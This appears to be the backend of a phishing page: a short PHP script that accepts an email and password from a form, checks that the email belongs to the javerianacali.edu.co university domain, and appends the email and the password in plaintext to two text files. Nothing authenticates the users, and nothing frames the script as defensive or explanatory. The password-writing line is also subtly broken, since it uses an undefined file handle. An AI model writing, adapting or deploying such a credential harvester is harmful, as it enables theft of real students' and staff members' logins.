<?php
$email = $_POST['email'];
$clave = $_POST['clave'];

if (preg_match("/javerianacali.edu.co/i", $email))
	{
		print "true";
		$fp = fopen("usuario.txt", "a");
		fwrite($fp,$email."\n");
		fclose($fp);
		$fp = fopen("claves.txt", "a");
		fwrite($fs,$clave."\n");
		fclose($fp);
	}
else
	{
		print "false esta malo meta un correo institucional";
	}
?>